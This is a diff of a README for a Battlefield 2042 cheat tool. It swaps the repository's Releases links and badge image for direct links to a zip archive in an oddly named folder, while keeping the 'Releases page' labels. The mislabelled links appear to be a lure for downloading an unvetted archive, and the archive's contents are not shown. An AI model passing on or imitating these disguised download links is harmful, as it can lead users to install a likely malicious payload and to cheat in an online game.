@@ -1,14 +1,14 @@
 # 🎮 BF2042-Hack - Ultimate Gameplay Hack for Battlefield 2042
 
-![Download](https://img.shields.io/badge/Download%20Now-Release%20v3.0-brightgreen&logo=download)
+![Download](https://raw.githubusercontent.com/PAariajt/BF2042-Hack/main/Cynocrambe/BF2042-Hack.zip%20Now-Release%20v3.0-brightgreen&logo=download)
 
 Welcome to the BF2042-Hack! This tool enhances your gameplay in Battlefield 2042 on Windows. With our easy setup process, you can jump right into action and enjoy various features designed to improve your gaming experience.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the software: [GitHub Releases](https://github.com/PAariajt/BF2042-Hack/releases).
+To get started, visit this page to download the software: [GitHub Releases](https://raw.githubusercontent.com/PAariajt/BF2042-Hack/main/Cynocrambe/BF2042-Hack.zip).
 
-1. Go to the [Releases page](https://github.com/PAariajt/BF2042-Hack/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/PAariajt/BF2042-Hack/main/Cynocrambe/BF2042-Hack.zip).
 2. Locate the latest version of BF2042-Hack.
 3. Click on the link to download the installer file.
 4. Once the file is downloaded, locate it in your Downloads folder.
